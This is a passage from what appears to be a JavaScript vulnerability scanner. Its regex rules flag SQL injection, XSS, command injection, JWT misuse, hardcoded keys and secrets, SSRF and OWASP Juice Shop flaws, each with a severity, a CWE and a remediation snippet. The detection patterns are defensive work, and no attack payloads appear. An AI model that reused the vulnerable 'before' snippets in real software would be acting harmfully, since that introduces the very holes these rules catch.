  {regex:/\.(?:isAdmin|isRole|role)\s*(?:===?\s*(?:true|['"]admin['"])|\)\s*\{)/g,vuln:"Inline Privilege Check",severity:"medium",cwe:"CWE-863",stride:"Elevation of Privilege",fix:"Use middleware-based RBAC instead of inline role checks.",code:"// BEFORE\nif (user.isAdmin) deleteAll();\n\n// AFTER\nrouter.delete('/all', requireRole('admin'), handler);"},
  {regex:/(?:privateKey|secretKey|signingKey|jwtSecret)\s*[=:]\s*['"`][-]{5}BEGIN/gi,vuln:"Exposed Private Key",severity:"critical",cwe:"CWE-321",stride:"Information Disclosure",kind:"secret",fix:"Never hardcode private keys. Load from environment variables or a secrets manager.",code:"// BEFORE\nconst privateKey = '-----BEGIN RSA PRIVATE KEY-----...';"+"\n\n// AFTER\nconst privateKey = process.env.RSA_PRIVATE_KEY;"},
  {regex:/createHmac\s*\(\s*['"][^'"]+['"]\s*,\s*['"][^'"]{8,}['"]/g,vuln:"Hardcoded HMAC Secret",severity:"critical",cwe:"CWE-321",stride:"Information Disclosure",kind:"secret",fix:"Use environment variables for HMAC signing secrets.",code:"// BEFORE\ncrypto.createHmac('sha256', 'hardcoded_secret');"+"\n\n// AFTER\ncrypto.createHmac('sha256', process.env.HMAC_SECRET);"},
  {regex:/(?:quantity|amount|price|total)\s*(?:<|>|<=|>=|!==?|===?)\s*0/g,vuln:"Missing Unsigned Numeric Validation",severity:"medium",cwe:"CWE-20",stride:"Tampering",fix:"Validate that numeric inputs are positive integers server-side before processing.",code:"// BEFORE\nawait BasketItem.update({ quantity: req.body.quantity });"+"\n\n// AFTER\nif (!Number.isInteger(req.body.quantity) || req.body.quantity < 1)\n  return res.status(400).json({ error: 'Invalid quantity' });"},
  // Juice Shop: feedback/review without purchase check
  {regex:/(?:Feedback|Review|Comment)\.create\s*\(/g,vuln:"Feedback Without Purchase Verification",severity:"medium",cwe:"CWE-840",stride:"Tampering",fix:"Verify user has purchased the product before allowing reviews.",code:"const order = await Order.findOne({ userId: req.user.id, ProductId: req.body.ProductId });\nif (!order) return res.status(403).json({ error: 'Not purchased' });"},
  // Juice Shop: zero-star / forced rating
  {regex:/rating\s*[<>=!]+\s*0|rating\s*:\s*0/g,vuln:"Zero-Star/Invalid Rating Submitted",severity:"medium",cwe:"CWE-20",stride:"Tampering",fix:"Validate rating is within 1–5 server-side; reject out-of-range values.",code:"if (req.body.rating < 1 || req.body.rating > 5) return res.status(400).json({ error: 'Invalid rating' });"},
  // Sensitive file endpoints
  {regex:/(?:path\.join|path\.resolve)\s*\([^)]*(?:'|\.\.).*(?:logs?|ftp|backup|upload|secret)/gi,vuln:"Sensitive Directory Path Construction",severity:"high",cwe:"CWE-22",stride:"Information Disclosure",fix:"Restrict file paths to a specific allowed directory; reject '..' and absolute paths.",code:"const safe = path.resolve('./uploads', file);\nif (!safe.startsWith(path.resolve('./uploads'))) throw 403;"},
  // Missing ownership check on basket operations
  {regex:/BasketItem\.(?:findOne|update|destroy|findAll)\s*\(/g,vuln:"Basket Operation (Verify User Ownership)",severity:"high",cwe:"CWE-639",stride:"Tampering",fix:"Verify basket belongs to authenticated user: BasketItem.findOne({ where: { id, BasketId: req.user.bid } })",code:"const item = await BasketItem.findOne({ where: { id: req.params.id, BasketId: req.user.bid } });\nif (!item) return res.status(404).json({ error: 'Not found' });"},
  {regex:/(?:coupon|discount|promo|voucher)\s*(?:\.\s*\w+|\[)/gi,vuln:"Coupon/Discount Reuse Risk",severity:"medium",cwe:"CWE-840",stride:"Tampering",fix:"Enforce server-side single-use coupon validation with a redemption log.",code:"// AFTER\nconst used = await UsedCoupon.findOne({ code, userId });"+"\nif (used) return res.status(400).json({ error: 'Coupon already redeemed' });"},
  // ── Race Condition / Double-Spend (financial read-check-write without transaction) ──
  {regex:/(?:findOne|findById|find_by)\s*\([^;]{0,200}\)\s*[^;]{0,300}(?:balance|credit|amount|wallet|points|token_count)[^;]{0,200}(?:update|save|increment|decrement|modify)\s*\(/g,vuln:"Race Condition — Financial Double-Spend",severity:"high",cwe:"CWE-362",stride:"Tampering",fix:"Wrap read-check-write in a database transaction with SELECT FOR UPDATE to prevent concurrent exploitation.",code:"// BEFORE (vulnerable to double-spend)\nconst wallet = await Wallet.findOne({ userId });\nif (wallet.balance < amount) return res.status(400);\nawait wallet.update({ balance: wallet.balance - amount });\n\n// AFTER\nawait sequelize.transaction(async t => {\n  const wallet = await Wallet.findOne({ userId, lock: true, transaction: t });\n  if (wallet.balance < amount) throw new Error('Insufficient');\n  await wallet.update({ balance: wallet.balance - amount }, { transaction: t });\n});"},
  // ── Missing Re-auth on Sensitive Account Operations ─────────────────────────
  {regex:/(?:router|app)\s*\.\s*(?:post|put|patch)\s*\([^)]*(?:password|email|role|mfa|two.?factor|admin)[^)]*\)[^{]{0,50}\{[^}]{0,600}(?:update|save|findOneAndUpdate|User\.update)\s*\(/g,vuln:"Sensitive Account Mutation Without Re-Authentication",severity:"high",cwe:"CWE-620",stride:"Elevation of Privilege",fix:"Require the user to re-enter their current password (or complete MFA) before allowing sensitive account changes.",code:"// BEFORE\nrouter.post('/change-email', auth, async (req, res) => {\n  await User.update({ email: req.body.email }, { where: { id: req.user.id } });\n});\n\n// AFTER\nrouter.post('/change-email', auth, async (req, res) => {\n  const user = await User.findByPk(req.user.id);\n  const valid = await bcrypt.compare(req.body.currentPassword, user.password);\n  if (!valid) return res.status(403).json({ error: 'Re-authentication required' });\n  await user.update({ email: req.body.email });\n});"},
  // ── Username/Account Enumeration via Differentiated Error Codes ─────────────
  {regex:/(?:findOne|find_by_email|User\.findOne)\s*\([^;]{0,200}\)\s*[^;]{0,100}(?:status\s*\(\s*404|send\s*\(\s*['"](?:User not found|No account|Invalid email))/g,vuln:"Account Enumeration via Differentiated Error",severity:"medium",cwe:"CWE-204",stride:"Information Disclosure",fix:"Return identical responses for valid and invalid accounts. Use 401 for all auth failures regardless of whether the account exists.",code:"// BEFORE\nif (!user) return res.status(404).json({ error: 'User not found' }); // oracle!\nif (!valid) return res.status(401).json({ error: 'Wrong password' });\n\n// AFTER\nif (!user || !valid) return res.status(401).json({ error: 'Invalid credentials' });"},
  // ── Timing Oracle — Non-Constant-Time Secret Comparison ─────────────────────
  {regex:/(?:===|!==|==|!=)\s*process\.env\.\w+|process\.env\.\w+\s*(?:===|!==|==|!=)/g,vuln:"Timing Oracle — Non-Constant-Time Secret Comparison",severity:"medium",cwe:"CWE-208",stride:"Information Disclosure",fix:"Use crypto.timingSafeEqual() for all comparisons involving secrets or API keys.",code:"// BEFORE\nif (req.headers['x-api-key'] === process.env.API_KEY) { ... }\n\n// AFTER\nconst a = Buffer.from(req.headers['x-api-key'] || '');\nconst b = Buffer.from(process.env.API_KEY || '');\nif (a.length !== b.length || !crypto.timingSafeEqual(a, b)) return res.status(401);"},
  // ── Missing Bounds on Financial/Quantity Fields ──────────────────────────────
  {regex:/(?:req|request|ctx)\s*(?:\.\s*body|\[\s*['"]body['"]\s*\])\s*[.[\s]*(?:quantity|amount|price|units|count|qty)\b(?![^;]{0,200}(?:Number\.isInteger|isNaN|Math\.abs|>=\s*1|>\s*0|>0|>=1|max\s*:))/g,vuln:"Missing Positive-Integer Validation on Financial Field",severity:"medium",cwe:"CWE-20",stride:"Tampering",fix:"Validate that financial/quantity fields are positive integers before processing. Negative values can create credit or reverse transactions.",code:"// BEFORE\nawait Order.create({ quantity: req.body.quantity, price: product.price });\n\n// AFTER\nconst qty = req.body.quantity;\nif (!Number.isInteger(qty) || qty < 1 || qty > 10000)\n  return res.status(400).json({ error: 'quantity must be 1-10000' });\nawait Order.create({ quantity: qty, price: product.price });"},
  // ── #22: Missing timeout on outbound HTTP requests (DoS) ─────────────────────
  {regex:/(?:await\s+)?(?:fetch|axios\.(?:get|post|put|patch|delete|request)|http\.(?:get|request)|https\.(?:get|request)|got)\s*\(/gi,vuln:"Missing Timeout on Outbound HTTP Request (DoS)",severity:"medium",cwe:"CWE-400",stride:"Denial of Service",fix:"Set a timeout on all outbound requests to prevent event-loop starvation from stalled upstreams.",code:"// fetch (Node 18+)\nconst resp = await fetch(url, { signal: AbortSignal.timeout(5000) });\n\n// axios\nawait axios.get(url, { timeout: 5000 });\n\n// node http\nconst req = http.get(url, cb);\nreq.setTimeout(5000, () => req.destroy());"},
  // ── #24: ORM collection queries without pagination limit (DoS) ───────────────
  {regex:/\.\s*(?:findAll|findMany|findAndCountAll)\s*\(\s*\{[^}]{0,500}\}/g,vuln:"ORM Collection Query Without Pagination Limit (DoS)",severity:"medium",cwe:"CWE-400",stride:"Denial of Service",fix:"Always set limit/take on collection queries to bound memory and DB load.",code:"const items = await Model.findAll({\n  where: { userId: req.user.id },\n  limit: Math.min(Number(req.query.limit) || 50, 100),\n  offset: Number(req.query.offset) || 0,\n});"},
  // ── #27: Missing audit log on sensitive mutations (Repudiation) ──────────────
  {regex:/(?:router|app)\s*\.\s*(?:delete|put|patch|post)\s*\([^)]{0,120}\)[^{]{0,40}\{[^}]{0,800}(?:User|Order|Payment|Role|Permission|Admin|Account|Invoice|Wallet)\s*\.\s*(?:destroy|delete|update|create|bulkCreate|findOneAndUpdate|findOneAndDelete)\s*\(/g,vuln:"Sensitive Mutation Without Audit Log (Repudiation Risk)",severity:"medium",cwe:"CWE-778",stride:"Repudiation",fix:"Record all sensitive mutations with actor, target, IP, and timestamp: await AuditLog.create({ action, actorId: req.user.id, targetId, ip: req.ip })",code:"await AuditLog.create({\n  action: 'resource.delete',\n  targetId: req.params.id,\n  actor: req.user.id,\n  ip: req.ip,\n  ua: req.headers['user-agent'],\n});"},
  // ── #29: Auth events without source IP/user-agent logging (Repudiation) ──────
  {regex:/(?:router|app)\s*\.\s*post\s*\(\s*['"`][^'"`]*(?:login|signin|logout|signout|authenticate|register|signup|password)[^'"`]*['"`][^{]{0,60}\{[^}]{0,800}(?:jwt\.sign|createToken|signToken|res\.json\s*\(\s*\{[^}]*token|res\.cookie)\s*\(/g,vuln:"Auth Event Without Source IP Logging (Repudiation Risk)",severity:"medium",cwe:"CWE-778",stride:"Repudiation",fix:"Log req.ip and req.headers['user-agent'] on every authentication event so account takeovers are traceable.",code:"logger.info('auth.success', {\n  userId: user.id,\n  ip: req.ip,\n  ua: req.headers['user-agent'],\n  ts: new Date().toISOString(),\n});"},
  // ── #30: Unguarded recursive processing of user-controlled data (DoS) ────────
  {regex:/(?:flatten|traverse|walk|deepMerge|deepClone|deepExtend|processTree|processNode|treeWalk)\s*\(\s*(?:req\.body|req\.query|req\.params|JSON\.parse\s*\()/gi,vuln:"Unguarded Recursive Processing of User Data (DoS)",severity:"high",cwe:"CWE-674",stride:"Denial of Service",fix:"Add a maxDepth parameter to any recursive function processing user-supplied data and throw when exceeded.",code:"function flatten(obj, depth = 0, maxDepth = 20) {\n  if (depth > maxDepth) throw new Error('Structure too deeply nested');\n  const result = {};\n  for (const k of Object.keys(obj)) {\n    if (typeof obj[k] === 'object' && obj[k] !== null)\n      Object.assign(result, flatten(obj[k], depth + 1, maxDepth));\n    else result[k] = obj[k];\n  }\n  return result;\n}"},
];

// ─── Structural Vulnerability Patterns ───────────────────────────────────────
// These match dangerous code constructs directly, no source-sink taint chain
// needed. They catch ~50 additional Juice Shop challenge patterns.
const STRUCTURAL_VULN_PATTERNS=[
  // ── SQL Injection ──────────────────────────────────────────────────────────
  {regex:/(?:sequelize|knex|db|connection|pool|mysql|pg)\s*\.\s*(?:query|raw|execute)\s*\(\s*`[^`]*\$\{/g,
   type:"Database Query",vuln:"SQL Injection (Template Literal)",severity:"critical",cwe:"CWE-89",stride:"Tampering",
   fix:"Use parameterized queries: db.query('SELECT * WHERE id=$1',[id])"},
  {regex:/(?:sequelize|knex|db|connection|pool)\s*\.\s*(?:query|raw|execute)\s*\(`[^`]*`\s*\+/g,
   type:"Database Query",vuln:"SQL Injection (Concatenation)",severity:"critical",cwe:"CWE-89",stride:"Tampering",
   fix:"Never concatenate user input into SQL strings"},
  {regex:/(?:sql|query|statement)\s*[+=]\s*[`'"][^`'"]*[`'"]\s*\+[^;]+(?:req\.|body\.|query\.|params\.)/g,
   type:"Database Query",vuln:"SQL Injection (String Build)",severity:"critical",cwe:"CWE-89",stride:"Tampering",
   fix:"Use parameterized queries exclusively"},
  // ── Broken Auth / JWT ──────────────────────────────────────────────────────
  {regex:/(?:jwt|jsonwebtoken)\s*\.\s*decode\s*\(/g,
   type:"JWT Decode",vuln:"JWT Decoded Without Signature Verification",severity:"high",cwe:"CWE-347",stride:"Spoofing",
   fix:"Always use jwt.verify() with algorithm pinning, never jwt.decode() for authentication"},
  {regex:/(?:jwt|jsonwebtoken)\s*\.\s*sign\s*\([^;)]{0,400}\)/g,
   type:"JWT Sign",vuln:"JWT Sign (Verify Algorithm Pinned)",severity:"high",cwe:"CWE-327",stride:"Spoofing",
   fix:"Specify algorithm: jwt.sign(payload, secret, { algorithm: 'RS256' })"},
  {regex:/algorithm[s]?\s*:\s*\[[^\]]*['"]none['"]/gi,
   type:"JWT Config",vuln:"JWT 'none' Algorithm Accepted (Auth Bypass)",severity:"critical",cwe:"CWE-327",stride:"Spoofing",
   fix:"Never include 'none' in the allowed algorithms list"},
  {regex:/jws\s*\.\s*(?:decode|verify)\s*\(/g,
   type:"JWS Operation",vuln:"JWS Token Operation (Verify Signature Check)",severity:"high",cwe:"CWE-347",stride:"Spoofing",
   fix:"Always verify JWS signatures and pin algorithms"},
  // ── XSS / Output Encoding ─────────────────────────────────────────────────
  {regex:/res\s*\.\s*(?:send|write|end)\s*\([^;)]*(?:req\.|\.body\.|\.query\.|\.params\.)[^;)]{0,200}\)/g,
   type:"HTTP Response",vuln:"Reflected XSS (User Input in Response)",severity:"high",cwe:"CWE-79",stride:"Tampering",
   fix:"Encode all user-supplied data with escapeHtml() before sending in responses"},
  {regex:/bypassSecurityTrust(?:Html|Script|Style|Url|ResourceUrl)\s*\(/g,
   type:"Angular Trust Bypass",vuln:"Angular DomSanitizer Bypass (XSS)",severity:"critical",cwe:"CWE-79",stride:"Tampering",
   fix:"Remove bypassSecurityTrust* calls and sanitize data upstream"},
  {regex:/nativeElement\s*\.\s*innerHTML\s*=/g,
   type:"Angular DOM Write",vuln:"Angular nativeElement.innerHTML (XSS)",severity:"critical",cwe:"CWE-79",stride:"Tampering",
   fix:"Use Angular [innerHTML] binding with DomSanitizer, or set textContent for plain text"},
  {regex:/document\s*\.\s*write\s*\(/g,
   type:"DOM Write",vuln:"document.write XSS Sink",severity:"critical",cwe:"CWE-79",stride:"Tampering",
   fix:"Never use document.write(); use safe DOM APIs (textContent, createElement)"},
  {regex:/\$\s*\(\s*(?:location|document|window)\s*\)/g,
   type:"jQuery DOM Source",vuln:"jQuery DOM-based XSS Source",severity:"high",cwe:"CWE-79",stride:"Tampering",
   fix:"Never pass location/document to jQuery $(); validate before DOM insertion"},
  // ── Path Traversal / File Ops ─────────────────────────────────────────────
  {regex:/(?:path\.join|path\.resolve|readFile|sendFile|createReadStream|download)\s*\([^;)]*(?:req\.|\.body\.|\.query\.|\.params\.)[^;)]{0,200}\)/g,
   type:"File Op",vuln:"Path Traversal (User-Controlled Path)",severity:"high",cwe:"CWE-22",stride:"Information Disclosure",
   fix:"Resolve path and verify it starts within allowed directory: if(!p.startsWith(base)) throw 403"},
  {regex:/res\s*\.\s*(?:sendFile|download)\s*\([^;)]*(?:req\.|\.body\.|\.query\.|\.params\.)/g,
   type:"File Serve",vuln:"Path Traversal (sendFile with User Input)",severity:"high",cwe:"CWE-22",stride:"Information Disclosure",
   fix:"Allowlist file paths; never pass raw user input to sendFile"},
  // ── Command Injection ──────────────────────────────────────────────────────
  {regex:/(?:exec|spawn|execSync|execFile)\s*\([^;)]*(?:req\.|\.body\.|\.query\.|\.params\.)[^;)]{0,200}\)/g,
   type:"OS Command",vuln:"Command Injection (User-Controlled Input)",severity:"critical",cwe:"CWE-78",stride:"Elevation of Privilege",
   fix:"Use execFile with argument array; never interpolate user input into shell commands"},
  {regex:/(?:vm\.runInContext|vm\.runInNewContext|new\s+vm\.Script)\s*\(/g,
   type:"VM Sandbox",vuln:"VM Sandbox Execution (RCE Risk)",severity:"critical",cwe:"CWE-94",stride:"Elevation of Privilege",
   fix:"Never execute user-supplied code in vm.runInContext; use a strict AST sandbox"},
  // ── Open Redirect ──────────────────────────────────────────────────────────
  {regex:/res\s*\.\s*redirect\s*\([^;)]*(?:req\.|\.body\.|\.query\.|\.params\.)[^;)]{0,200}\)/g,
   type:"Redirect",vuln:"Open Redirect (User-Controlled URL)",severity:"high",cwe:"CWE-601",stride:"Spoofing",
   fix:"Validate redirect targets against an explicit allowlist of trusted origins"},
  // ── SSRF ──────────────────────────────────────────────────────────────────
  {regex:/(?:fetch|axios\.(?:get|post|put|delete|request)|http\.(?:get|request)|https\.(?:get|request)|got\s*\()\s*\([^;)]*(?:req\.|\.body\.|\.query\.|\.params\.)[^;)]{0,200}\)/g,
   type:"Outbound HTTP",vuln:"SSRF (User-Controlled Request URL)",severity:"high",cwe:"CWE-918",stride:"Spoofing",
   fix:"Allowlist URLs/hostnames; block RFC-1918 addresses and loopback"},
  // ── Mass Assignment ────────────────────────────────────────────────────────
  {regex:/\.\s*(?:create|update|upsert|bulkCreate|findOrCreate)\s*\(\s*(?:req\.body|body|\{[^}]{0,80}\.\.\.\s*(?:req\.body|body))\s*[,)]/g,
   type:"Model Write",vuln:"Mass Assignment (req.body Direct to Model)",severity:"high",cwe:"CWE-915",stride:"Tampering",
   fix:"Explicitly allowlist fields: const {name,email} = req.body; model.create({name,email})"},
  {regex:/Object\.assign\s*\([^,)]+,\s*(?:req\.body|body)\s*[,)]/g,
   type:"Object Merge",vuln:"Mass Assignment (Object.assign with req.body)",severity:"high",cwe:"CWE-915",stride:"Tampering",
   fix:"Never Object.assign(model, req.body); allowlist individual fields"},
  // ── IDOR ──────────────────────────────────────────────────────────────────
  {regex:/\.\s*(?:findById|findByPk|findOne|update|destroy|findOneAndUpdate|findOneAndDelete)\s*\(\s*(?:req\.|body\.|query\.|params\.)\s*\w+/g,
   type:"Direct Lookup",vuln:"Potential IDOR (User-Controlled ID)",severity:"high",cwe:"CWE-639",stride:"Tampering",
   fix:"Always verify: const item = await Model.findOne({_id: req.params.id, owner: req.user.id})"},
  // ── Information Disclosure ────────────────────────────────────────────────
  {regex:/(?:res|response)\s*\.\s*(?:json|send)\s*\(\s*(?:err|error|e)\s*(?:\.|)\s*(?:stack|message)?\s*\)/g,
   type:"Error Disclosure",vuln:"Error/Stack Trace Exposed to Client",severity:"medium",cwe:"CWE-209",stride:"Information Disclosure",
   fix:"Log errors server-side; return generic error messages to clients"},
  {regex:/res\s*\.\s*json\s*\(\s*(?:user|users|account|customer|member|profile)\s*\)/g,
   type:"Data Exposure",vuln:"Full User Object Exposed in Response",severity:"high",cwe:"CWE-200",stride:"Information Disclosure",
   fix:"Return only required fields; use a serializer/DTO to strip sensitive attributes"},
  {regex:/res\s*\.\s*(?:json|send)\s*\(\s*process\.env\s*[,)]/g,
   type:"Config Exposure",vuln:"process.env Exposed in HTTP Response",severity:"critical",cwe:"CWE-200",stride:"Information Disclosure",
   fix:"Never serialize process.env into HTTP responses"},
  {regex:/error\s*\.\s*stack/g,
   type:"Stack Trace",vuln:"Stack Trace in Code (Risk of Exposure)",severity:"medium",cwe:"CWE-209",stride:"Information Disclosure",
   fix:"Capture stack traces in server logs only, never send to clients"},
  // ── Cryptographic Failures ────────────────────────────────────────────────
  {regex:/createHash\s*\(\s*['"](?:md5|sha1)['"]\s*\)\s*\.\s*update/g,
   type:"Weak Hash",vuln:"MD5/SHA1 Password Hashing",severity:"critical",cwe:"CWE-916",stride:"Information Disclosure",
   fix:"Use bcrypt or argon2 for password storage, never MD5/SHA1",
   severityFn:_md5Sha1PasswordHashSeverity},
  {regex:/crypto\s*\.\s*createHash\s*\(\s*['"](?:md5|sha1)['"]/gi,
   type:"Weak Hash",vuln:"Weak Cryptographic Hash (MD5/SHA1)",severity:"high",cwe:"CWE-916",stride:"Information Disclosure",
   fix:"Use SHA-256 minimum for non-password hashing; bcrypt/argon2 for passwords",
   severityFn:_md5Sha1WeakHashSeverity},
  {regex:/(?:token|key|secret|nonce|salt|id)\s*=\s*Math\.random\s*\(\s*\)/gi,
   type:"Weak PRNG",vuln:"Cryptographically Weak PRNG (Math.random)",severity:"high",cwe:"CWE-338",stride:"Spoofing",
   fix:"Use crypto.randomBytes(32) or crypto.randomUUID() for security tokens"},
  // ── Injection (other) ─────────────────────────────────────────────────────
  {regex:/(?:eval|new\s+Function)\s*\([^;)]*(?:req\.|\.body\.|\.query\.|\.params\.)[^;)]{0,200}\)/g,
   type:"Code Eval",vuln:"Code Injection (eval with User Input)",severity:"critical",cwe:"CWE-94",stride:"Elevation of Privilege",
   fix:"Never eval user-controlled strings; use a whitelist-based parser"},
  {regex:/JSON\.parse\s*\([^;)]*(?:req\.|\.body\.|\.query\.|Buffer\.from|atob\s*\(|\.decode\s*\()/g,
   type:"Deserialization",vuln:"Unsafe Deserialization (User-Controlled JSON)",severity:"high",cwe:"CWE-502",stride:"Elevation of Privilege",
   fix:"Validate JSON structure with a schema (Joi/zod) before parsing"},
  {regex:/(?:parseString|parseStringPromise|new\s+(?:xml2js\.)?Parser\s*\(|libxmljs\.parseXml|sax\.createStream)\s*\(/g,
   type:"XML Parser",vuln:"Unsafe XML Parsing (XXE Risk)",severity:"high",cwe:"CWE-611",stride:"Information Disclosure",
   fix:"Disable external entities in XML parser options"},
  {regex:/(?:console\.(?:log|info|warn|error)|logger\.(?:info|warn|error|debug|log)|log\.(?:info|warn|error|debug)|winston\b[^(]{0,20}\(|pino\b[^(]{0,20}\()\s*\([^;)]{0,300}(?:req\.|\.body\.|\.query\.|\.params\.|req\.headers)[^;)]{0,300}\)/g,
   type:"Log Injection",vuln:"Log Injection (Unsanitized User Input Logged)",severity:"medium",cwe:"CWE-117",stride:"Repudiation",
   fix:"Sanitize user-controlled values before logging: const safe = v => String(v).replace(/[\\r\\n\\t]/g,' ').substring(0,200);"},
  {regex:/(?:console\.(?:log|info|warn|error)|logger\.(?:info|warn|error|debug|log)|log\.(?:info|warn|error|debug))\s*\(\s*`[^`]{0,400}\$\{[^}]{0,100}(?:req\.|body\.|query\.|params\.|headers\.)[^}]{0,100}\}[^`]{0,400}`/g,
   type:"Log Injection",vuln:"Log Injection via Template Literal (Unsanitized User Input)",severity:"medium",cwe:"CWE-117",stride:"Repudiation",
   fix:"Sanitize interpolated values: logger.info(`User: ${String(req.body.name).replace(/[\\r\\n]/g,' ').substring(0,200)}`)"},
  // ── Broken Access Control ─────────────────────────────────────────────────
  {regex:/(?:app|router)\s*\.\s*(?:get|post|put|delete|patch)\s*\(\s*['"`][^'"`]*(?:admin|manage|superuser|\/api\/admin)[^'"`]*['"`]/gi,
   type:"Admin Route",vuln:"Admin/Management Route (Verify Auth)",severity:"high",cwe:"CWE-862",stride:"Elevation of Privilege",
   fix:"Protect admin routes with requireRole('admin') middleware"},
  {regex:/(?:app|router)\s*\.\s*post\s*\(\s*['"`][^'"`]*\/(?:login|signin|register|signup|auth|token|password|forgot|reset|otp|mfa|2fa|verify)[^'"`]*['"`]/gi,
   type:"Auth Endpoint",vuln:"Auth Endpoint Without Rate Limiting",severity:"medium",cwe:"CWE-307",stride:"Denial of Service",
   fix:"Apply express-rate-limit to all auth endpoints: router.post('/login', rateLimit({ windowMs: 15*60*1000, max: 10 }), handler)",
   predicate:_authRateLimitPredicate},
  // ── Security Misconfiguration ─────────────────────────────────────────────
  {regex:/res\s*\.\s*cookie\s*\(((?:[^()]|\([^()]*\)){0,400})\)/g,
   type:"Cookie Config",vuln:"Cookie Set Without Proper Security Flags",severity:"medium",cwe:"CWE-614",stride:"Information Disclosure",
   fix:"Set {httpOnly:true, secure:true, sameSite:'strict'} on all cookies",
   predicate:_cookiePredicate},
  {regex:/\bcors\s*\(((?:[^()]|\([^()]*\)){0,400})\)/g,
   type:"CORS Config",vuln:"Permissive CORS (Allow-Origin: *)",severity:"medium",cwe:"CWE-942",stride:"Spoofing",
   fix:"Restrict CORS origins to specific trusted domains",
   predicate:_corsPredicate},
  {regex:/(?:multer|busboy|formidable)\s*[.(]/g,
   type:"File Upload",vuln:"File Upload Handler (Verify MIME/Extension/Size)",severity:"medium",cwe:"CWE-434",stride:"Elevation of Privilege",
   fix:"Validate file type, extension, size; store outside webroot; randomize filenames"},
  {regex:/session\s*\(\s*\{[^}]*secret\s*:\s*['"][^'"]{1,20}['"][^}]*\}/g,
   type:"Session Config",vuln:"Weak/Hardcoded Session Secret",severity:"high",cwe:"CWE-798",stride:"Spoofing",kind:"secret",
   fix:"Use a cryptographically random secret loaded from environment variables"},
  // ── Prototype Pollution ───────────────────────────────────────────────────
  {regex:/(?:req\.body|request\.body)\s*(?:\[[\w.'"]+\]){1,3}\s*=/g,
   type:"Proto Pollution",vuln:"Prototype Pollution (Dynamic Bracket Assignment)",severity:"critical",cwe:"CWE-1321",stride:"Tampering",
   fix:"Block __proto__, constructor, prototype keys before any bracket assignment"},
  // ── Insecure Direct Data Flows ────────────────────────────────────────────
  {regex:/res\s*\.\s*(?:json|send)\s*\(\s*(?:await\s+)?(?:\w+\.)?(?:findAll|find|findAndCountAll)\s*\(/g,
   type:"Data Exposure",vuln:"Bulk Data Query Result Directly Returned",severity:"high",cwe:"CWE-200",stride:"Information Disclosure",
   fix:"Apply field filtering, pagination and ownership checks before returning query results"},
  {regex:/(?:\.select\s*\(['"]\+password['"]\)|password\s*:\s*1\b)/g,
   type:"Password Exposure",vuln:"Password Field Included in Query Result",severity:"critical",cwe:"CWE-256",stride:"Information Disclosure",
   fix:"Explicitly exclude password/hash fields from all query results"},
  // ── Indirect IDOR — findAll without ownership scope ───────────────────────
  {regex:/\.\s*(?:findAll|findMany|find\s*\(\s*\{)\s*\(\s*\{[^}]{0,300}\}\s*\)/g,
   type:"Potential Indirect IDOR",vuln:"Potential Indirect IDOR — findAll Without Ownership Scope",severity:"high",cwe:"CWE-639",stride:"Information Disclosure",
   fix:"Scope all collection queries to the authenticated user: always include userId/ownerId in the where clause."},
  // ── Type Confusion via JSON.parse of Auth Headers ─────────────────────────
  {regex:/JSON\.parse\s*\(\s*(?:Buffer\.from|atob|base64|decode)\s*\([^)]*(?:authorization|x-token|bearer|x-api|x-auth|jwt|cookie)/gi,
   type:"Type Confusion Deserialization",vuln:"Type Confusion — JSON.parse of Auth Header (Trust Without Verification)",severity:"critical",cwe:"CWE-502",stride:"Elevation of Privilege",
   fix:"Never trust client-supplied JSON for auth decisions. Use jwt.verify() with algorithm pinning — never jwt.decode() or raw JSON.parse of auth headers."},
  // ── Critical Mass Assignment to app/process globals ──────────────────────
  {regex:/Object\.assign\s*\(\s*(?:app\.locals|app\.settings|process\.env)\s*,/g,
   type:"Global State Pollution",vuln:"Mass Assignment to Global Application State",severity:"critical",cwe:"CWE-915",stride:"Elevation of Privilege",
   fix:"Never merge user-controlled objects into app.locals, app.settings, or process.env. Allowlist only specific keys."},
  // ── GraphQL Introspection Enabled in Production Config ───────────────────
  {regex:/(?:new\s+ApolloServer|ApolloServer\s*\()\s*\{[^}]{0,500}introspection\s*:\s*true/g,
   type:"GraphQL Config",vuln:"GraphQL Introspection Enabled (Schema Exposure)",severity:"medium",cwe:"CWE-200",stride:"Information Disclosure",
   fix:"Disable introspection in production: new ApolloServer({ introspection: process.env.NODE_ENV !== 'production' })"},
  // ── GraphQL Playground / Explorer Enabled ────────────────────────────────
  {regex:/(?:playground|explorer)\s*:\s*true/g,
   type:"GraphQL Config",vuln:"GraphQL Playground Enabled (Unauthenticated Schema Browser)",severity:"medium",cwe:"CWE-200",stride:"Information Disclosure",
   fix:"Disable GraphQL Playground/Explorer in production environments."},
  // ── GraphQL Missing Depth/Complexity Limit ────────────────────────────────
  {regex:/new\s+ApolloServer\s*\(\s*\{(?![^}]{0,800}(?:depthLimit|complexityLimit|queryDepth|maxDepth))[^}]{0,800}\}\s*\)/g,
   type:"GraphQL Config",vuln:"GraphQL Missing Query Depth/Complexity Limit (DoS Risk)",severity:"medium",cwe:"CWE-400",stride:"Denial of Service",
   fix:"Add depth and complexity limits: install graphql-depth-limit and graphql-query-complexity. Reject deeply nested queries."},
  // ── OAuth — Missing state Parameter ──────────────────────────────────────
  {regex:/passport\.authenticate\s*\(\s*['"](?:google|github|facebook|twitter|oauth2|azuread|saml)[^'"]*['"](?:\s*,\s*\{[^}]*\})?(?![^}]{0,200}state)/g,
   type:"OAuth Config",vuln:"OAuth CSRF — Missing state Parameter",severity:"high",cwe:"CWE-352",stride:"Spoofing",
   fix:"Always include a cryptographically random state parameter in OAuth flows to prevent CSRF-based account linking attacks."},
  // ── OAuth Callback Without state Validation ───────────────────────────────
  {regex:/(?:router|app)\s*\.\s*get\s*\([^)]*(?:callback|oauth|redirect)[^)]*\)[^{]{0,50}\{[^}]{0,400}(?:req\.query\.code|req\.query\.token)(?![^}]{0,400}(?:state|session\.\w+))/g,
   type:"OAuth Config",vuln:"OAuth Callback Without state Validation (Authorization Code Injection)",severity:"high",cwe:"CWE-352",stride:"Spoofing",
   fix:"Validate req.query.state === req.session.oauthState before exchanging the authorization code."},
  // ── Password Reset Token Enumeration Oracle ───────────────────────────────
  {regex:/(?:findOne|find_by_token|where.*resetToken)\s*\([^;]{0,200}\)\s*[^;]{0,100}(?:404|'Invalid token'|"Invalid token"|'Token not found'|"Token not found")/g,
   type:"Auth Oracle",vuln:"Password Reset Token Oracle (Enumeration via Status Code)",severity:"medium",cwe:"CWE-204",stride:"Spoofing",
   fix:"Return identical responses whether the token is valid or not. Apply rate limiting on the reset endpoint."},
  // ── #23: Busboy / Formidable without file-size limits (DoS) ─────────────────
